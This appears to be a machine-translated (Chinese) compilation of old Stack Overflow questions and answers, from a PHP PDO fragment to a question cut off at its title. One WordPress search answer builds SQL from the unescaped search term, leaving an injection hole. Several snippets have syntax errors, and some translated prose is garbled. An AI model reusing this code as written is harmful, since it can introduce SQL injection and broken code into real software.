// for WHERE user_ID = :u_ID AND thread_ID = :tid
$st2 = $db->prepare($sql);
$st2->bindParam(':u_ID', $u_ID);
$st2->bindParam(':tid', $tid);
$st2->execute();
or
$st2->execute(array(':tid'=>$tid, ':u_ID' => $u_ID);

// for SET time = :current_time WHERE user_ID = :u_ID AND thread_ID = :tid
$st3 = $db->prepare($sql);
$st3->bindParam(':u_ID', $u_ID);
$st3->bindParam(':tid', $tid);
$st3->bindParam(':current_time', $current_time);
$st3->execute();
or
$st3->execute(array(':tid'=>$tid, ':u_ID' => $u_ID, ':current_time' => $current_time);

// for VALUES (:u_ID, :tid, :current_time)
$st4 = $db->prepare($sql);
$st4->bindParam(':u_ID', $u_ID);
$st4->bindParam(':tid', $tid);
$st4->bindParam(':current_time', $current_time);
$st4->execute();
or
$st4->execute(array(':tid'=>$tid, ':u_ID' => $u_ID, ':current_time' => $current_time); 
```

# java - JSF 自定义组件：支持自定义类型的参数，从不调用属性设置器

> ID：13491805
> 
> 赞同：6
> 
> 时间：2012-11-21T11:00:34.000
> 
> 标签：java, jsf, jsf-2, attributes, custom-component

我根据许多教程之一创建了我的自定义**JSF组件（我正在使用****PrimeFaces**），我添加了一个已成功传递给组件的参数。

```
<c:custom command="command"/> 
```

```
public void setCommand(String command) {
    log.debug("setCommand {}", command);
    this.command = command;
} 
```

但是我需要自定义类型的参数，这是我在教程中找不到的东西，教程只处理最琐碎的情况。

```
<c:custom image="#{currentImageBean.image}"/> 
```

```
public void setImage(Object image) {
    log.debug("setImage {}", image);
    this.image = (Image) image;
} 
```

bean 正在返回**Image**类型的对象，但未调用 setter。我预计这会起作用，因为否则一个好的教程应该提到这种情况，但现在我被更糟糕的错误所困扰：没有任何反应，日志中没有任何内容表明原因......所以，出了什么问题，我需要改变什么，在哪里寻找潜在的错误？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-21T12:09:20.460

这与自定义类型无关。这与使用文字（静态）值与 EL 相比，如`attributename="attributevalue"`与`attributename="#{attribute.value}"`.

这种行为是预期的并且是规范的。[`ValueExpression`](http://docs.oracle.com/javaee/6/api/javax/el/ValueExpression.html)EL 表达式 ( s) 的属性值由 设置[`UIComponent#setValueExpression()`](http://docs.oracle.com/javaee/6/api/javax/faces/component/UIComponent.html#setValueExpression%28java.lang.String,%20javax.el.ValueExpression%29)。它们应该只在*真正*被请求时才被评估，通常是在视图渲染期间。在烘焙实例期间不应*直接*`UIComponent`评估它们，因为这会破坏动态值表达式的性质（考虑取决于数据表的当前迭代轮次）。

更好的是将可以保存 EL 值表达式的属性的 getter/setter 委托[`UIComponent#getStateHelper()`](http://docs.oracle.com/javaee/6/api/javax/faces/component/UIComponent.html#getStateHelper%28%29)给本地属性，而不是本地属性。`setValueExpression()`遗嘱最终也归结于`StateHelper`。[`UIComponent#getAttributes()`](http://docs.oracle.com/javaee/6/api/javax/faces/component/UIComponent.html#getAttributes%28%29)还解析来自 的值[`StateHelper`](http://docs.oracle.com/javaee/6/api/javax/faces/component/StateHelper.html)。

```
public Image getImage() {
   return (Image) getStateHelper().eval("image");
}

public void setImage(Image image) {
    getStateHelper().put("image", image);
} 
```

请注意，没有本地属性。因此，当您需要属性的（评估）值时，只需调用 getter。

为了实现您的初始功能要求，即设置属性的日志记录，您可能希望将日志记录语句添加到`setValueExpression()`委托给`super`.

```
@Override
public void setValueExpression(String name, ValueExpression binding) {
    log.debug(....);
    super.setValueExpression(name, binding);
} 
```

# javascript - 子窗口未在 IE 中发回变量值

> ID：13491812
> 
> 赞同：0
> 
> 时间：2012-11-21T11:01:02.933
> 
> 标签：javascript, arrays, variables, dom-events, childwindow

我有一个按钮，它打开一个带有图像列表的子窗口，用户可以单击该图像列表，该按钮将参数中的值发送到一个函数，在该函数中，它将参数放在一个数组值中的变量中，该变量已在父窗口中创建，然后关闭子窗口。我目前的代码在 Chrome 和 Firefox 中工作，但在 IE 中不能工作，原因我不知道！如果可能的话，我希望它能够在 IE 7 中运行，尽管目前它甚至在 IE 9 中都无法运行。

**父窗口代码：**

```
var edge;

function getEdgeProfile(){
    myEdge = window.open('edge.html','','top=50,left=50,width=400,height=400');
} 
```

**子窗口代码：**

```
<head>
<script>

function selectEdge(name, price, type){
    opener.edge = [name, price, type];
    window.close();
}

</script>
</head>
<body>

<img src="1.png" width="100px" height="100px" onClick='selectEdge("Square Edge 2mm ARRIS", 30.5, 1)'>
<img src="2.png" width="100px" height="100px" onClick='selectEdge("4 x 4 mm SINGLE BEVEL", 38.56, 1)'>
<img src="3.png" width="100px" height="100px" onClick='selectEdge("4 x 4 mm DOUBLE BEVEL", 46.49, 1)'>
<img src="4.png" width="100px" height="100px" onClick='selectEdge("V JOINT WITH SINGLE PENCIL", 38.56, 2)'>

</body> 
```

我会添加一个 JSFiddle，但它会打开一个单独的页面，所以我不能~任何帮助表示赞赏！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T12:08:34.720

当您关闭弹出窗口时，弹出窗口分配的数据将丢失。（在 IE 中）

我建议从弹出窗口中调用一个函数到开启器，并将数据作为参数。然后该函数将数据设置（复制）到 opener 中的变量。所以，这应该工作：（
尚未测试）

**子窗口：**

```
function selectEdge(name, price, type){
    opener.setEdge(name, price, type);
    window.close();
} 
```

**父窗口：**

```
function setEdge(name, price, type){
    edge = [name, price, type];
} 
```

# javascript - document.open 如何影响历史？

> ID：13491823
> 
> 赞同：2
> 
> 时间：2012-11-21T11:01:49.640
> 
> 标签：javascript, dom, browser-history

我不明白这个论点是做什么的`replace`。从文档中：

> 选修的。如果设置，新文档的历史条目会继承打开此文档的文档的历史条目

这不是意味着没有`replace`新打开的文档将以其状态添加到历史记录中吗？这就是我打开它的方式：

```
var newDoc = document.open("text/html");
newDoc.write(file);
newDoc.close(); 
```

基本上我想要的是让历史按钮记住那些。我一直在使用 history.js 并想知道这是否可以节省我一些时间。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T11:29:55.953

您似乎在引用[w3schools](http://www.w3schools.com/jsref/met_doc_open.asp)，这[不是很可靠](http://w3fools.com/)。[MDN 文档页面](https://developer.mozilla.org/en-US/docs/DOM/document.open)甚至没有提到该参数，并且W3C[规范](http://www.w3.org/TR/DOM-Level-2-HTML/html.html#ID-72161170)声明`document.open`不接受任何参数（甚至不接受您作为第一个参数传递的内容类型）。`replace`因此，传递值 for跨浏览器工作的希望并不大。

话虽如此，我从引用的摘录中理解的内容与您所说的完全相反：如果您通过`true`，新页面将继承开启者文档的历史记录；如果你不这样做，它会启动一个新的历史线程。说得通？

# php - 如何修改 wordpress 搜索以查询分类术语和类别术语？

> ID：13491828
> 
> 赞同：5
> 
> 时间：2012-11-21T11:01:58.007
> 
> 标签：php, wordpress

我想修改搜索，所以如果说我有一个名为“作者”的分类法并在帖子中添加了“Ian Rankin”一词，如果我搜索“Ian Rankin”，我希望该帖子出现。我想目前它只搜索标题和内容。 **我怎样才能让它也成为搜索词？**

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-11-21T12:20:36.980

You can alter the search query using filter hooks to join the taxonomy tables.

e.g. to also search on the 'author' taxonomy

First join the taxonomy tables

```
function tax_search_join( $join )
{
  global $wpdb;
  if( is_search() )
  {
    $join .= "
        INNER JOIN
          {$wpdb->term_relationships} ON {$wpdb->posts}.ID = {$wpdb->term_relationships}.object_id
        INNER JOIN
          {$wpdb->term_taxonomy} ON {$wpdb->term_taxonomy}.term_taxonomy_id = {$wpdb->term_relationships}.term_taxonomy_id
        INNER JOIN
          {$wpdb->terms} ON {$wpdb->terms}.term_id = {$wpdb->term_taxonomy}.term_id
      ";
  }
  return $join;
}
add_filter('posts_join', 'tax_search_join'); 
```

then find the search term in the taxonomy 'author'

```
function tax_search_where( $where )
{
  global $wpdb;
  if( is_search() )
  {
    // add the search term to the query
    $where .= " OR
    (
      {$wpdb->term_taxonomy}.taxonomy LIKE 'author'
      AND
      {$wpdb->terms}.name LIKE ('%".$wpdb->escape( get_query_var('s') )."%')
    ) ";
  }
  return $where;
}
add_filter('posts_where', 'tax_search_where'); 
```

and finally group the results by post id to avoid duplicate results because of the join

```
function tax_search_groupby( $groupby )
{
  global $wpdb;
  if( is_search() )
  {
    $groupby = "{$wpdb->posts}.ID";
  }
  return $groupby;
}
add_filter('posts_groupby', 'tax_search_groupby'); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2019-12-30T22:25:47.950

也可以通过使用 MySQL 的**EXISTS**函数和将**term_relationships**与**terms**连接起来的子查询来完成。我创建了以下代码段并将其放入**functions.php**中。这至少适用于 WordPress 版本 5.3.1：

```
// Search titles and tags
function and_extend_search( $search, &$wp_query ) {

    global $wpdb;

    if ( empty( $search ))
        return $search;

    $terms = $wp_query->query_vars[ 's' ];
    $exploded = explode( ' ', $terms );
    if( $exploded === FALSE || count( $exploded ) == 0 )
        $exploded = array( 0 => $terms );

    $search = '';

    foreach( $exploded as $tag ) {
        $search .= " AND (
            ($wpdb->posts.post_title LIKE '%$tag%')

            OR EXISTS
            (
                SELECT 
                    *
                FROM 
                    $wpdb->term_relationships 
                LEFT JOIN 
                    $wpdb->terms 
                ON 
                    $wpdb->term_relationships.term_taxonomy_id = $wpdb->terms.term_id
                WHERE
                        $wpdb->terms.name LIKE '%$tag%'
                    AND
                        $wpdb->term_relationships.object_id = $wpdb->posts.ID
            )
        )";
    }

    return $search;
}
add_filter('posts_search', 'and_extend_search', 500, 2); 
```

# python - 在 matplotlib 中使用 yscale('log') 时缺少错误栏

> ID：13491829
> 
> 赞同：12
> 
> 时间：2012-11-21T11:02:04.977
> 
> 标签：python, matplotlib

在某些情况下，matplotlib 在使用对数刻度时会错误地显示带有误差线的绘图。假设这些数据（例如在 pylab 中）：

```
s=[19.0, 20.0, 21.0, 22.0, 24.0]
v=[36.5, 66.814250000000001, 130.17750000000001, 498.57466666666664, 19.41]
verr=[0.28999999999999998, 80.075044597909169, 71.322124839818571, 650.11015891565125, 0.02]
errorbar(s,v,yerr=verr) 
```

我得到一个正常的结果，但是当我切换到对数刻度时：

```
yscale('log') 
```

我得到一个图，其中一些误差条不可见，尽管您仍然可以看到一些误差条上限。（见下文。）为什么会发生这种情况，我该如何解决？

![对数图示例](../Images/3d8a8410a9018db5d208885e33fdc99f.png)

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2014-03-24T04:19:09.510

切换到对数刻度，但使用以下命令：

```
plt.yscale('log', nonposy='clip') 
```

类似地，对于 x 轴：

```
plt.xscale('log', nonposx='clip') 
```

无论如何，如果您在过去半年获得了[matplotlib 的开发版本，则默认情况下您将具有这种剪裁行为，如](https://github.com/matplotlib/matplotlib/tree/master)[Make nonposy='clip' default for log scale y-axes](https://github.com/matplotlib/matplotlib/pull/2147)中所述。

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2012-11-21T12:08:17.493

问题是，对于某些点`v-verr`正在变为负数，值 <=0 无法在对数轴上显示（`log(x)`,`x<=0`未定义）要解决此问题，您可以使用非对称错误并强制生成的值高于零以获取违规点。

在这种情况下，在错误大于`verr>=v`我们分配的值的任何时候，`verr=.999v`错误栏将接近于零。

这是脚本

```
import matplotlib.pyplot as plt
import numpy as np

s=[19.0, 20.0, 21.0, 22.0, 24.0]
v=np.array([36.5, 66.814250000000001, 130.17750000000001, 498.57466666666664, 19.41])
verr=np.array([0.28999999999999998, 80.075044597909169, 71.322124839818571,     650.11015891565125, 0.02])
verr2 = np.array(verr)
verr2[verr>=v] = v[verr>=v]*.999999
plt.errorbar(s,v,yerr=[verr2,verr])
plt.ylim(1E1,1E4)
plt.yscale('log')
plt.show() 
```

这是结果

![带误差线的对数图](../Images/a425a08d89128b2e008f975f7005a866.png)

# html - 修复了窗口中的“返回顶部”按钮，例如当 HTML 页面滚动 200 像素时可见

> ID：13491836
> 
> 赞同：0
> 
> 时间：2012-11-21T11:02:34.263
> 
> 标签：html, css, scroll, visible

我正在一个网站上工作，想知道是否有任何代码可以添加到“固定在窗口”项目中，例如，一旦访问者滚动 200 像素，该项目就会可见。

在任何其他问题中都找不到专门针对此的任何内容。

干杯

我的错，我发现了这个，也许这就是我正在寻找的[使用 jQuery 仅在滚动位置介于 2 点之间时才显示 div](https://stackoverflow.com/questions/2592420/use-jquery-to-show-a-div-only-when-scroll-position-is-between-2-points)。如我错了请纠正我 ：-）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T11:56:40.673

您可以使用 j Query 检测滚动位置，然后如果移动滚动隐藏您的 div。下面给出的是示例代码。请查看它并根据您的要求对其进行一些工作，它对我来说很好。

```
 <script type='text/javascript' src='http://code.jquery.com/jquery-1.7.1.js'></script>
            <script type='text/javascript'>//<![CDATA[ 
            $(window).load(function(){
            $(function() {
                $.fn.scrollBottom = function() {
                    return $(document).height() - this.scrollTop() - this.height();
                };

                var $el = $('#sidebar>div');
                var $window = $(window);
                var top = $el.parent().position().top;

                $window.bind("scroll resize", function() {
                    var gap = $window.height() - $el.height() - 10;
                    var visibleFoot = 172 - $window.scrollBottom();
                    var scrollTop = $window.scrollTop()

                    if (scrollTop < top + 10) {
                        $el.css({
                            top: (top - scrollTop) + "px",
                            bottom: "auto"
                        });
                    } else if (visibleFoot > gap) {
                        $el.css({
                            top: "auto",
                            bottom: visibleFoot + "px"
                        });
                    } else {
                        $el.css({

                            //use your css property here if you want to display none a div
                            display: none,
                            bottom: "auto"

                        });
                    }
                }).scroll();
            });
            });//]]>  

            </script> 
```

# apache - 我需要更改 apache http 服务器上的端口号

> ID：13491837
> 
> 赞同：1
> 
> 时间：2012-11-21T11:02:36.320
> 
> 标签：apache, http

指示

1 使用管理员帐户登录到您的 Apache 服务器计算机。

2 打开开始菜单并单击“我的电脑”图标。

3 导航到服务器主硬盘驱动器或之前安装 WAMP 的驱动器上的 C:\wamp\Apache2\conf 目录。

4 找到标有“http.conf”的文件并双击它以在 Windows 记事本应用程序中打开它。

5 同时按下“control”和“F”键启动搜索实用程序。

6 在搜索字段中输入“80”并点击“查找下一个”。您现在将被带到设置 localhost 端口的配置文件部分。

7 将“80”更改为您选择的端口，然后保存“http.conf”文件以更新您的服务器。您可能需要重新启动服务器才能识别新端口。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-21T11:09:53.827

您在配置文件中搜索的项目是“Listen”。默认值为 80，这是 HTTP 的标准。

例子：

```
Listen 8000 
```

参考：[http ://httpd.apache.org/docs/2.2/mod/mpm_common.html#listen](http://httpd.apache.org/docs/2.2/mod/mpm_common.html#listen)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2015-01-08T11:23:00.580

简单快捷。默认打开 Apache 配置文件“httpd.conf”，它在 80 端口上运行。因此您可以将其更改为任何值。在这里，我将 80 更改为 81。

* * *

例如。"Listen 80" to "Listen 81" 现在重新启动 apache web 服务器。而已。你已经完成了。谢谢。

# mysql - 使用 sum() 子查询连接三个表

> ID：13491838
> 
> 赞同：0
> 
> 时间：2012-11-21T11:02:40.850
> 
> 标签：mysql, database, join, relational-database

我无法让查询从两个表中提取数据，中间有第三个表。让我告诉你我的意思。

```
*Table companies*
id int PK
name text 

*Table projects*
id int PK
company_id int FK
project_name text

*Table hours_worked*
id int pk
user_id int FK
project_id int FK
hours float
date_worked datetime

*Table users*
id int PK
user_name text 
```

基本上，我需要的是一个查询，它根据**用户 ID提取****每家公司**的总工作时间。

 **请注意，table_hours working 每个项目每天可以有多个提交。例如，几行可能看起来像

```
id  project_id user_id  hours  date_worked
 1       1        1       2     20-08-2012
 2       1        1       1.5   20-08-2012
 3       2        1       3     21-08-2012
 4       2        2       12    22-08-2012 
```

我想要的结果将是一个返回如下内容的查询：

```
company_name     total_hours
 Bobs Kitchens       25
 Mikes Bikes         67 
```

它返回每个**公司**（而不是项目）的总工作小时数，例如用户 ID 为 1 的用户。

这是我尝试过的以下查询，但无济于事：

```
 SELECT DISTINCT companies.name as company_name,
        companies.id as company_id,
        (
          SELECT SUM(hours_worked.hours) FROM hours_worked
          WHERE projects.id = hours_worked.project_id
          AND projects.company_id = company_id
        ) as total_hours
        FROM hoursworked, companies, projects
        WHERE projects.company_id = company_id
        AND projects.company_id = projects.company_id
        AND hours_worked.user_id = 1
        GROUP BY companies.id 
```

这给了我一个奇怪的结果，每个 total_hours 字段似乎都显示了一个非常奇怪的数字。75 不是任何公司的正确总小时数！

```
company_name   total_hours
Mikes Kitchen      75
Charlies Bikes     75
 .....             75 
```

任何帮助将不胜感激！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T11:32:09.663

试试这个：

```
SELECT c.name company_name, u.user_name, SUM(h.hours) total_hours
FROM projects p 
INNER JOIN companies c ON p.company_id = c.id 
INNER JOIN hours_worked h ON p.id = h.project_id 
INNER JOIN users u ON h.user_id = u.id
GROUP BY c.id, u.id 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T11:40:18.683

我真是个傻瓜……实际上比我预期的要容易得多。为过度思考而欢呼。

我使用的查询是：

```
SELECT SUM(hours_worked.hours) as 'total_hours',
                companies.name
                FROM companies, hours_worked, projects
                WHERE companies.id = projects.company_id
                      AND hours_worked.project_id = projects.id
                      AND hours_worked.uid = 1
                      GROUP BY companies.id ORDER BY companies.name DESC 
```**

# iphone - 如何在我的 iOS 应用程序中获取后台运行应用程序的详细信息？

> ID：13491839
> 
> 赞同：5
> 
> 时间：2012-11-21T11:02:43.507
> 
> 标签：iphone, objective-c, xcode

我想开发一个应用程序，它应该监控我的 I-Phone 设备（包括互联网浏览器）上运行了多少应用程序。

请分享您对这篇文章的看法。

有点像这样： [https ://itunes.apple.com/us/app/system-manager/id455736462?mt=8](https://itunes.apple.com/us/app/system-manager/id455736462?mt=8)

谢谢

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-21T11:19:25.927

你真的不能，因为 Apple 对 iOS 应用程序设置了非常严格的指导方针。尽管通过一些低级别的调用，您可能会获得一些正在运行的进程信息。

由于沙盒环境，您可能无法获得更多信息。

如果后台没有运行标志（voip、音频、位置或附件），后台应用程序也会暂停。此外，如果系统内存不足，挂起的应用程序会被杀死并释放内存。

* * *

你可以做什么：

*   尝试[所有进程列表](http://developer.apple.com/legacy/mac/library/#qa/qa2001/qa1123.html)OS X 代码
*   [我们可以检索当前在 iPhone 和 iPad 上运行的应用程序吗](https://stackoverflow.com/questions/4312613/can-we-retrieve-the-applications-currently-running-in-iphone-and-ipad)

但请记住 Apple 对您的应用程序的限制：[iOS 环境](https://developer.apple.com/library/ios/#DOCUMENTATION/iPhone/Conceptual/iPhoneOSProgrammingGuide/TheiOSEnvironment/TheiOSEnvironment.html)，因此应用程序商店中有可用的应用程序可以执行您想要的操作并不意味着您的应用程序将被允许。

# c#-4.0 - 我想在访问中选择一个日期

> ID：13491840
> 
> 赞同：0
> 
> 时间：2012-11-21T11:02:44.590
> 
> 标签：c#-4.0

从表 1 中选择日期，其中日期 <=（选择格式（日期，'mm/##/yyyy'）作为表 2 中的日期）。此查询返回“02/##/2011”。我想制作一个类似“02/02/2011”、“02/03/2011”等的列表。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T11:08:28.743

我认为问题出在您的查询上，如果它是查询的话。通过 putt star (*) 而不是 hash(#) 更改您的查询。

# mysql - 选择具有最大列值的行，由另一列分组，没有嵌套的选择语句

> ID：13491844
> 
> 赞同：2
> 
> 时间：2012-11-21T11:02:56.507
> 
> 标签：mysql, sql, sql-server

我知道这是 [Select Rows with Maximum Column Value group](https://stackoverflow.com/questions/1425240/select-rows-with-maximum-column-value-group-by-another-column) by another Column 但我想选择具有最大列值的行，作为另一列分组，但**没有嵌套的 select 语句**，我知道它可以像这：

```
SELECT
    T.Name,
    T.Rank,
    T.ID
FROM MyTable T
WHERE T.Rank = (
    SELECT MAX( T1.Rank) FROM MyTable T1
    WHERE T1.Name= T.Name
) 
```

表架构在哪里`ID, Rank, Name`，我想先按名称按结果分组，然后从每个名称组中选择一行，具体取决于哪一行的排名最高。

附件是我要从中选择的表格示例 ![在此处输入图像描述](../Images/d68206db99ebc76003ad91c9740719fe.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T11:18:48.223

```
mysql> SELECT t1.nm, t1.rank,t1.id
 FROM mytable t1
 LEFT JOIN (
   SELECT nm, max(rank) as top
   FROM mytable t2
   GROUP BY nm
 ) AS t2 ON t1.nm=t2.nm AND t1.rank = t2.top
 WHERE t2.nm IS not NULL
 ORDER BY nm;

+----+------+---------+
| nm | rank | id      |
+----+------+---------+
| m  |   -1 | b7kjhsf |
| n  |   13 | d3sf    |
+----+------+---------+
2 rows in set (0.00 sec)

mysql> select * from mytable;

+----+------+----------+
| nm | rank | id       |
+----+------+----------+
| n  |   11 | asfd     |
| n  |   11 | bsf      |
| n  |   11 | zzasdfsf |
| n  |   13 | d3sf     |
| n  |   11 | effesf   |
| n  |   10 | yxxgesf  |
| n  |   11 | bkhjusf  |
| m  |   -1 | b7kjhsf  |
| m  |   -4 | cdfgabsf |
+----+------+----------+
9 rows in set (0.00 sec) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T11:14:53.003

正如另一个答案中提到的，我所知道的唯一其他选择是使用公用表表达式：

```
;WITH CTE AS
(
    T.Name,
    T.Rank,
    T.ID,
    ROW_NUMBER() OVER
       (PARTITION BY Name ORDER BY Rank DESC)
    AS RowNumber
    FROM MyTable
)

SELECT *
FROM CTE
WHERE RowNumber = 1 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-21T11:17:34.503

```
SELECT Name, Id, Rank FROM 
(
    SELECT T.Name, T.Id, T.Rank, RANK() OVER (PARTITION BY T.Name ORDER BY T.Rank DESC) = 1 AS NameRank
    FROM MyTable T
)
WHERE NameRank = 1 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-21T11:20:24.987

不确定您是否只是想排除嵌套选择，以及是否可以接受加入子选择。如果是这样的话：-

```
SELECT
    T.Name,
    T.Rank,
    T.ID
FROM MyTable T
INNER JOIN (SELECT Name, MAX(Rank) AS MaxRank FROM MyTable GROUP BY Name ) T1
ON T.Name = T1.Name
AND T.Rank = T1.MaxRank 
```

# sql-server - 如何在 fn_dblog() 中找到与特定表相关的行

> ID：13491845
> 
> 赞同：2
> 
> 时间：2012-11-21T11:02:56.210
> 
> 标签：sql-server, transaction-log

从我在 MS-SQL 中读到的各种信息`fn_dblog()`中，我认为其中`AllocUnitName`包含表名。但是最近，我正在检查是否删除了特定表的行，但在返回的结果中找不到它的名称`fn_dblog(null,null)`。有些行`dbo.MyTable.PK_xxxx`只有`dbo.MyTable`. 这是一张每天有数十笔交易的表，所以我想知道是否`AllocUnitName`是查找表名的正确位置。我在这里使用 MS-SQL 2008 R2。

因此，如果`AllocUnitName`不是正确的查看位置，我应该在哪里查看 fn_dblog(null,null) 返回的结果以获取特定表的特定记录。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T13:46:25.820

简短的回答是，谁知道呢？`fn_dblog()`没有记录或支持，因此无法说出它返回的信息的真正含义。

话虽如此，我猜那`db.MyTable.PK_xxxx`是表的主键，并且由于默认情况下 PK 是聚集的，并且聚集索引包含表数据，所以它在某种意义上*是表。*因此，我认为这`AllocUnitName`确实是您想要的，但是使用未记录的系统程序始终需要您自担风险，并且您不应该期望任何有保证的答案。

# javascript - 如何自动打开 iframe？

> ID：13491846
> 
> 赞同：1
> 
> 时间：2012-11-21T11:02:58.437
> 
> 标签：javascript, jquery, jsp

我有两个 iframe，iframe1 和 iframe2。iframe1 有 4 个链接。现在，当我单击最后一个链接时，我已经能够关闭 iframe。但是在关闭它时，我希望在没有任何用户启动操作的情况下打开 iframe2。我怎样才能做到这一点？

这是我用来关闭 iframe1 的代码，然后我试图像这样调用 iframe2：

编辑 ：

```
function prepareFrame() {
alert("Inside prepare frame");
ifrm = document.createElement("IFRAME");
ifrm.setAttribute("src", "openThis.jsp");
ifrm.style.width = 640+"px";
ifrm.style.height = 480+"px";
document.body.appendChild(ifrm);
}

function closeMyIframe() {
  var parentDynamicDiv = window.parent.document.getElementById('dynamic_id1');
  var iframe = window.parent.document.getElementById('dynamic_id2');
  iframe.style.display = 'none';
  parentDynamicDiv.style.display = 'none';
  prepareFrame();
} 
```

此处 prepareFrame() 中的警报即将出现，但模式未出现。

iframe1 来源于一个名为 myJSP.jsp 的父 jsp，所以当关闭时，我认为控件返回到该 jsp。从那里开始，我怎样才能自动打开新的 iframe？

请帮忙。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T11:16:17.323

假设您的 iframe1 id 是`dynamic_id1`， iframe2 id 是`dynamic_id2`并且您的功能`closeMyIframe()`在 iframe1 页面内。

如果是这样，只需更改您的代码行 4，从

```
iframe.style.display = 'none'; 
```

到

```
iframe.style.display = 'block'; 
```

# android - android上Listview中的数据库存储图像

> ID：13491848
> 
> 赞同：1
> 
> 时间：2012-11-21T11:02:59.877
> 
> 标签：android, android-listview, android-arrayadapter

我必须用图像实现搜索列表视图..我实现了搜索方法并列出了详细信息..我如何将图像放在角落的列表视图中..

*   图像将在 sqlite 数据库中......我如何从数据库中获取图像？我怎样才能把它放到一个数组适配器中？现在只有一个字符串包括

代码是：

```
ArrayAdapter<String> adapter;
private ArrayList<String> results1 = new ArrayList<String>(); 
```

[这里](https://plus.google.com/photos/111266316610051914435/albums/5813219256697437521?banner=pwa&authkey=CKDDiaS8g_Spfg)字符串中的结果将在适配器中..我如何使用这些适配器声明图像... [1](https://plus.google.com/photos/111266316610051914435/albums/5813219256697437521?banner=pwa&authkey=CKDDiaS8g_Spfg)：

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T11:11:20.220

您可以通过以下方式转换为base64字符串来存储图像。

这是将base64字符串解码为图像（位图）的函数......

```
public static Bitmap decodeBase64(String input) 
    {
        byte[] decodedByte = Base64.decode(input, 0);
        return BitmapFactory.decodeByteArray(decodedByte, 0, decodedByte.length); 
    } 
```

这是将图像编码为base64字符串的函数

```
 public static String encodeTobase64(Bitmap image)
{
    Bitmap immagex=image;
    ByteArrayOutputStream baos = new ByteArrayOutputStream();  
    immagex.compress(Bitmap.CompressFormat.JPEG, 100, baos);
    byte[] b = baos.toByteArray();
    String imageEncoded = Base64.encodeToString(b,Base64.DEFAULT);

    return imageEncoded;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T11:07:34.393

您可以使用 blob (byte[]) 将图像存储到 sqlite 数据库中。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-21T11:14:53.963

此答案从数据库中读取图像，根据您的要求进行相应更改：

```
 SQLiteDatabase myDb;       
           String MySQL;
           byte[] byteImage1 = null; 
           byte[] byteImage2 = null;
           MySQL="create table emp1(_id INTEGER primary key autoincrement, sample TEXT not null, picture BLOB);";
           myDb = openOrCreateDatabase("Blob List", Context.MODE_PRIVATE, null);
           myDb.execSQL(MySQL);
           String s=myDb.getPath();
           textView.append("\r\n" + s+"\r\n");       
           myDb.execSQL("delete from emp1");
           ContentValues newValues = new ContentValues();
           newValues.put("sample", "HI Hello");

        try
        {
        FileInputStream instream = new FileInputStream("/sdcard/Pictures/picture.jpg"); 
        BufferedInputStream bif = new BufferedInputStream(instream); 
        byteImage1 = new byte[bif.available()]; 
        bif.read(byteImage1); 
        textView.append("\r\n" + byteImage1.length+"\r\n"); 
        newValues.put("picture", byteImage1); 

        long ret = myDb.insert("emp1", null, newValues); 
        if(ret<0) textView.append("\r\n!!! Error add blob filed!!!\r\n");
        } catch (IOException e) 
        {
            textView.append("\r\n!!! Error: " + e+"!!!\r\n");   
        }

        Cursor cur = myDb.query("emp1",null, null, null, null, null, null);
        cur.moveToFirst();
        while (cur.isAfterLast() == false)
        {
            textView.append("\r\n" + cur.getString(1)+"\r\n");
            cur.moveToNext();
        }
    ///////Read data from blob field////////////////////
        cur.moveToFirst();
        byteImage2=cur.getBlob(cur.getColumnIndex("picture")); 
        bmImage.setImageBitmap(BitmapFactory.decodeByteArray(byteImage2, 0, byteImage2.length));
        textView.append("\r\n" + byteImage2.length+"\r\n"); 

        cur.close();

        myDb.close(); 
```

# c# - 无法访问文件，因为它被另一个进程使用

> ID：13491849
> 
> 赞同：0
> 
> 时间：2012-11-21T11:03:10.120
> 
> 标签：c#, multithreading

我在一个程序中使用[TvdbLib 。](http://code.google.com/p/tvdblib/)这个库可以使用缓存来更快地加载电视剧。为了进一步提高程序的速度，我在单独的线程上加载所有电视剧。当两个线程同时运行并尝试同时从缓存中读取/写入时，我将收到以下错误：

> 该进程无法访问文件“C:\BinaryCache\79349\series_79349.ser”，因为它正被另一个进程使用。

有谁知道如何避免这种情况并仍然让程序顺利运行？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T11:10:09.817

`CacheProvider`不是为在多线程场景中使用而构建的......要么仅在一个线程中使用它，要么`lock`在通过共享的每次访问中使用它，`object`或者为每个线程提供它自己`CacheProvider`的不同`_root`目录（在构造函数中）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-21T11:10:44.840

您可以使用 lock 语句来确保只有一个线程同时访问缓存：

[http://msdn.microsoft.com/en-us/library/c5kehkcz(v=vs.71).aspx](http://msdn.microsoft.com/en-us/library/c5kehkcz(v=vs.71).aspx)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-21T11:11:22.573

从错误中我假设 TvdbLib 不支持访问同一缓存的多个并发线程。由于它是一个开源项目，您可以获取源代码并针对缓存访问实施您自己的保护，例如，使用 lock 语句。当然，您可以在调用 TvdbLib 之前在您自己的代码中锁定，但由于这将是更高级别，锁定将保持更长时间，您可能无法获得您想要的细粒度并发。

# jquery - 使用 jQuery 设置列宽

> ID：13491852
> 
